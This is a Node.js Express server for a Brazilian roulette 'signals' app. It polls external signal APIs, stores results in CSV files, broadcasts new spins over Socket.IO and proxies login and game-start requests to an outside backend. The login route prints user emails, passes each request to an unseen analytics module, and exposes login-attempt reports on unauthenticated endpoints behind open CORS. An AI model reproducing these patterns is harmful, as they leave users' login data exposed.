// server.js (DUPLA ROLETA BRASILEIRA: ANTIGA + NOVA PLAYTECH)
import express from 'express';
import { createServer } from 'http';
import { Server } from 'socket.io';
import path from 'path';
import { fileURLToPath } from 'url';
import fetch from 'node-fetch';
import cors from 'cors';
import { loadAllExistingSignalIds, appendToCsv, getFullHistory, SOURCES } from './src/utils/csvService.js';

// --- IMPORTAÇÃO DO NOVO MÓDULO DE ANALYTICS ---
import analytics from './loginAnalytics.js';

console.log(`\n\n${'='.repeat(60)}`);
console.log(`--- INICIANDO SERVIDOR --- ${new Date().toISOString()}`);
console.log(`${'='.repeat(60)}\n`);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const httpServer = createServer(app);

// --- SOCKET.IO ---
const io = new Server(httpServer, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

const lastEmittedSignalIds = {}; 

// --- CONSTANTES DE URL ---
const API_URLS = {
    immersive: 'https://apptemporario-production.up.railway.app/api/0194b479-654d-70bd-ac50-9c5a9b4d14c5',
    brasileira: 'https://apptemporario-production.up.railway.app/api/0194b473-2ab3-778f-89ee-236e803f3c8e',
    brasileiraplay: 'https://pbrapi.sortehub.online/api/sinais/historico', 
    default: 'https://apptemporario-production.up.railway.app/api/0194b473-4604-7458-bb18-e3fc562980c2',
    speed: 'https://apptemporario-production.up.railway.app/api/0194b473-c347-752f-9eaf-783721339479',
    xxxtreme: 'https://apptemporario-production.up.railway.app/api/0194b478-5ba0-7110-8179-d287b2301e2e',
    vipauto: 'https://apptemporario-production.up.railway.app/api/0194b473-9044-772b-a6fc-38236eb08b42'
};

const FETCH_INTERVAL_MS = 3000; 
const DEFAULT_AUTH_PROXY_TARGET = process.env.AUTH_PROXY_TARGET || 'https://api.appbackend.tech';

console.log(`🎯 Proxy Target: ${DEFAULT_AUTH_PROXY_TARGET}`);

// --- TESTE DE CONECTIVIDADE COM O SERVIDOR DE AUTH ---
async function testAuthServer() {
    console.log(`\n🔍 Testando conexão com ${DEFAULT_AUTH_PROXY_TARGET}...`);
    try {
        const start = Date.now();
        const response = await fetch(DEFAULT_AUTH_PROXY_TARGET, { 
            method: 'GET',
            timeout: 10000 
        });
        const elapsed = Date.now() - start;
        console.log(`✅ Servidor respondeu: ${response.status} (${elapsed}ms)`);
    } catch (err) {
        console.error(`❌ Servidor NÃO respondeu: ${err.message}`);
    }
}
testAuthServer();

// --- MIDDLEWARES GLOBAIS ---
app.use((req, res, next) => {
    const start = Date.now();
    console.log(`\n📥 [${new Date().toISOString()}] ${req.method} ${req.url}`);
    
    res.on('finish', () => {
        const duration = Date.now() - start;
        const icon = res.statusCode >= 400 ? '❌' : '✅';
        console.log(`${icon} [RESPONSE] ${req.method} ${req.url} - ${res.statusCode} (${duration}ms)`);
    });
    next();
});

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- ROTA /login (COM ANALYTICS INTEGRADO) ---
app.post('/login', async (req, res) => {
    const targetUrl = `${DEFAULT_AUTH_PROXY_TARGET}/login`;
    const bodyData = JSON.stringify(req.body);
    const startTime = Date.now(); // Início da medição de tempo para analytics

    // Extrai credenciais apenas para log no console (Analytics cuida do arquivo)
    const email = req.body.email || req.body.username || 'N/A';
    
    console.log(`\n${'═'.repeat(60)}`);
    console.log(`🔐 [LOGIN REQUEST] -> ${targetUrl}`);
    console.log(`   📧 Email: ${email}`);
    console.log(`${'═'.repeat(60)}`);
    
    try {
        const response = await fetch(targetUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0'
            },
            body: bodyData
        });
        
        const elapsed = Date.now() - startTime;
        const responseText = await response.text();
        const success = response.status >= 200 && response.status < 300;

        // --- INTEGRAÇÃO ANALYTICS (SUCESSO OU FALHA HTTP) ---
        analytics.logLoginAttempt(req, {
            success: success,
            statusCode: response.status,
            responseTime: elapsed,
            errorType: success ? null : `HTTP_${response.status}`,
            errorMessage: success ? null : `Status Code ${response.status}`
        });

        console.log(`\n📥 [FETCH RESPONSE] Status: ${response.status} (${elapsed}ms)`);
        
        // Repassa os headers (limpeza)
        response.headers.forEach((value, key) => {
            if (!['content-encoding', 'transfer-encoding', 'content-length'].includes(key.toLowerCase())) {
                res.setHeader(key, value);
            }
        });
        
        try {
            const jsonResponse = JSON.parse(responseText);
            res.status(response.status).json(jsonResponse);
        } catch {
            res.status(response.status).send(responseText);
        }
        
    } catch (err) {
        const elapsed = Date.now() - startTime;
        console.error(`\n❌ [FETCH ERROR]: ${err.message}`);
        
        // --- INTEGRAÇÃO ANALYTICS (ERRO DE REDE/CÓDIGO) ---
        analytics.logLoginAttempt(req, {
            success: false,
            statusCode: 500, // Erro interno/rede
            responseTime: elapsed,
            errorType: err.code || 'NETWORK_ERROR',
            errorMessage: err.message
        });
        
        res.status(500).json({ 
            error: true, 
            message: err.message,
            code: err.code 
        });
    }
});

// --- NOVAS ROTAS DE ANALYTICS ---

// 1. Relatório processado (Insights, Gráficos)
app.get('/api/analytics/report', (req, res) => {
    const report = analytics.analyzePatterns();
    res.json(report);
});

// 2. Imprimir relatório no console do servidor (para debug rápido)
app.post('/api/analytics/print', (req, res) => {
    analytics.printAnalyticsReport();
    res.json({ message: 'Relatório impresso no console do servidor' });
});

// --- ROTA /start-game ---
app.all(/\/start-game.*/, async (req, res) => {
    // Normaliza a URL removendo o prefixo local e mantendo query params/caminhos
    const cleanPath = req.url.replace('/start-game', ''); 
    const targetUrl = `${DEFAULT_AUTH_PROXY_TARGET}/start-game${cleanPath}`;
    
    console.log(`\n🎮 [START-GAME] -> ${targetUrl}`);
    
    try {
        const fetchOptions = {
            method: req.method,
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0'
            }
        };
        
        if (req.headers.authorization) {
            fetchOptions.headers['Authorization'] = req.headers.authorization;
        }
        
        if (req.method !== 'GET' && req.body && Object.keys(req.body).length > 0) {
            fetchOptions.body = JSON.stringify(req.body);
        }
        
        const response = await fetch(targetUrl, fetchOptions);
        const responseText = await response.text();
        
        console.log(`   Response: ${response.status}`);
        
        try {
            const jsonResponse = JSON.parse(responseText);
            res.status(response.status).json(jsonResponse);
        } catch {
            res.status(response.status).send(responseText);
        }
        
    } catch (err) {
        console.error(`❌ [START-GAME ERROR]: ${err.message}`);
        res.status(500).json({ error: true, message: err.message });
    }
});

// --- STATIC FILES ---
app.use(express.static(path.join(__dirname, 'dist')));

// --- SOCKET EVENTS ---
io.on('connection', (socket) => {
    console.log(`⚡ Cliente Socket conectado: ${socket.id}`);
    socket.on('disconnect', () => {
        console.log(`🔌 Cliente Socket desconectado: ${socket.id}`);
    });
});

// --- FETCH LOGIC ---
const normalizeData = (data) => {
    if (Array.isArray(data)) return data;
    if (data && data.games && Array.isArray(data.games)) return data.games;
    if (data && data.history && Array.isArray(data.history)) return data.history;
    if (data && data.signalId) return [data];
    return [];
};

async function fetchAndSaveFromSource(url, sourceName) {
    try {
        const response = await fetch(url);
        if (!response.ok) throw new Error(`Status: ${response.status}`);
        
        const data = await response.json();
        const normalizedData = normalizeData(data);
        
        if (normalizedData.length > 0) {
            await appendToCsv(normalizedData, sourceName);

            if (sourceName === 'Brasileira PlayTech') {
                const latestItem = normalizedData[0];
                const latestId = latestItem.signalId || latestItem.signalid || latestItem.id;

                if (latestId && latestId !== lastEmittedSignalIds[sourceName]) {
                    lastEmittedSignalIds[sourceName] = latestId;
                    console.log(`⚡ [SOCKET PLAYTECH] Novo giro: ${latestItem.signal} (${latestItem.color || '?'})`);
                    
                    io.emit('novo-giro', {
                        source: 'Brasileira PlayTech',
                        data: {
                            signal: latestItem.signal,
                            color: latestItem.color,
                            gameId: latestItem.gameId,
                            signalId: latestId,
                            createdAt: new Date().toISOString()
                        }
                    });
                }
            }
        }
    } catch (err) {
        if (!err.message.includes('404')) {
            console.error(`❌ [FETCH - ${sourceName}] Erro:`, err.message);
        }
    }
}

async function fetchAllData() {
    await Promise.all([
        fetchAndSaveFromSource(API_URLS.immersive, 'immersive'),
        fetchAndSaveFromSource(API_URLS.brasileira, 'brasileira'), 
        fetchAndSaveFromSource(API_URLS.brasileiraplay, 'Brasileira PlayTech'), 
        fetchAndSaveFromSource(API_URLS.default, 'default'),
        fetchAndSaveFromSource(API_URLS.speed, 'speed'),
        fetchAndSaveFromSource(API_URLS.xxxtreme, 'xxxtreme'),
        fetchAndSaveFromSource(API_URLS.vipauto, 'vipauto')
    ]);
}

// --- API ---
app.get('/api/full-history', async (req, res) => {
    try {
        const sourceName = req.query.source;
        if (!sourceName || !SOURCES.includes(sourceName)) return res.status(400).json({ error: 'Source inválida' });
        
        const history = await getFullHistory(sourceName);
        res.json(history);
    } catch (error) {
        res.status(500).json({ error: 'Erro leitura', details: error.message });
    }
});

app.get('/health', (req, res) => res.status(200).json({ 
    status: 'OK', 
    socket: 'active',
    timestamp: new Date().toISOString(),
    proxyTarget: DEFAULT_AUTH_PROXY_TARGET
}));

app.get(/.*/, (req, res) => {
    if (req.url.startsWith('/api/')) return res.status(404).json({ error: 'Not Found' });
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

// --- START ---
const startServer = async () => {
    const PORT = process.env.PORT || 3000;
    try {
        await loadAllExistingSignalIds();
        
        // Imprime relatório inicial se houver dados
        console.log('📊 Carregando analytics...');
        // analytics.printAnalyticsReport(); // Opcional: descomentar se quiser ver ao iniciar

        httpServer.listen(PORT, '0.0.0.0', () => {
            console.log(`\n${'='.repeat(60)}`);
            console.log(`🚀 SERVIDOR RODANDO NA PORTA ${PORT}`);
            console.log(`${'='.repeat(60)}`);
            console.log(`📌 Fontes de dados ativas e monitorando.`);
            console.log(`📈 Analytics de Login: ATIVO`);
            console.log(`   Use GET /api/analytics/report para ver estatísticas.`);
            console.log(`${'='.repeat(60)}\n`);
            fetchAllData(); 
            setInterval(fetchAllData, FETCH_INTERVAL_MS); 
        });
    } catch (err) {
        console.error("❌ ERRO AO INICIAR:", err);
        process.exit(1);
    }
};

startServer();